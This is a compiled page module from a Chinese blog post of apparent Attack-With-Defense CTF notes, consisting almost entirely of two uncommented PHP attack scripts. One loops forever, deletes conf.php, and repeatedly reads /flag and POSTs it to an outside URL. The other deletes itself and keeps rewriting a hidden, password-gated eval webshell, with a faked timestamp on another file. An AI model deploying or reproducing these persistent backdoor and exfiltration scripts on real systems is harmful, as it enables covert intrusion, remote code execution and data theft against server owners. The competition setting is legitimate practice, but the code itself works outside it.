import{_ as n,o as s,c as a,b as t}from"./app-D-TC3Ll_.js";const p={},e=t(`<p>🚧</p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre class="language-php"><code><span class="line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span>
<span class="line"><span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;max_execution_time&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;0&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">function</span> <span class="token function-definition function">send_post</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$post_data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token variable">$postdata</span> <span class="token operator">=</span> <span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$post_data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span></span>
<span class="line">        <span class="token string single-quoted-string">&#39;http&#39;</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span></span>
<span class="line">            <span class="token string single-quoted-string">&#39;method&#39;</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">&#39;POST&#39;</span><span class="token punctuation">,</span></span>
<span class="line">            <span class="token string single-quoted-string">&#39;header&#39;</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">&#39;Content-type:application/x-www-form-urlencoded&#39;</span><span class="token punctuation">,</span></span>
<span class="line">            <span class="token string single-quoted-string">&#39;content&#39;</span> <span class="token operator">=&gt;</span> <span class="token variable">$postdata</span><span class="token punctuation">,</span></span>
<span class="line">            <span class="token string single-quoted-string">&#39;timeout&#39;</span> <span class="token operator">=&gt;</span> <span class="token number">15</span> <span class="token operator">*</span> <span class="token number">60</span></span>
<span class="line">        <span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"><span class="token variable">$flag_tmp</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;flag{xxx}&quot;</span><span class="token punctuation">;</span></span>
<span class="line">@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;conf.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token constant boolean">True</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/flag&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token variable">$data</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span></span>
<span class="line">        <span class="token string single-quoted-string">&#39;flag&#39;</span> <span class="token operator">=&gt;</span> <span class="token variable">$flag</span></span>
<span class="line">    <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token operator">!=</span><span class="token variable">$flag_tmp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token function">send_post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;http://&#39;</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">    <span class="token variable">$flag_tmp</span><span class="token operator">=</span><span class="token variable">$flag</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"><span class="token delimiter important">?&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre class="language-php"><code><span class="line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> </span>
<span class="line"><span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;.index.php&#39;</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;c5ebfc2dd566bb4610cdfcd17c873dba&quot;){@eval($_POST[a]);} ?&gt;&#39;</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span></span>
<span class="line">    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .2.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span> </span>
<span class="line"><span class="token delimiter important">?&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3),l=[e];function o(c,i){return s(),a("div",null,l)}const r=n(p,[["render",o],["__file","AWDzaji.html.vue"]]),k=JSON.parse(`{"path":"/blogs/jishu/AWDzaji.html","title":"🚧AWD杂记🚧","lang":"zh-CN","frontmatter":{"title":"🚧AWD杂记🚧","mathjax":true,"date":"2023/10/23","tags":["AWD"],"categories":["技术"],"description":"🚧","head":[["meta",{"property":"og:url","content":"https://sakee.cn/sake-s-blog/blogs/%E6%8A%80%E6%9C%AF/AWD%E6%9D%82%E8%AE%B0.html"}],["meta",{"property":"og:site_name","content":"sake's blog"}],["meta",{"property":"og:title","content":"🚧AWD杂记🚧"}],["meta",{"property":"og:description","content":"🚧"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"fullstacksake"}],["meta",{"property":"article:tag","content":"AWD"}],["meta",{"property":"article:published_time","content":"2023-10-22T16:00:00.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"🚧AWD杂记🚧\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-10-22T16:00:00.000Z\\",\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fullstacksake\\",\\"email\\":\\"fullstacksake@outlook.com\\"}]}"],["meta",{"property":"og:url","content":"https://sakee.cn/sake-s-blog/blogs/jishu/AWDzaji.html"}],["meta",{"property":"og:site_name","content":"sake's blog"}],["meta",{"property":"og:title","content":"🚧AWD杂记🚧"}],["meta",{"property":"og:description","content":"🚧"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"fullstacksake"}],["meta",{"property":"article:tag","content":"AWD"}],["meta",{"property":"article:published_time","content":"2023-10-22T16:00:00.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"🚧AWD杂记🚧\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-10-22T16:00:00.000Z\\",\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fullstacksake\\",\\"email\\":\\"fullstacksake@outlook.com\\"}]}"]]},"headers":[],"git":{"createdTime":null,"updatedTime":null,"contributors":[]},"filePathRelative":"blogs/技术/AWD杂记.md"}`);export{r as comp,k as data};
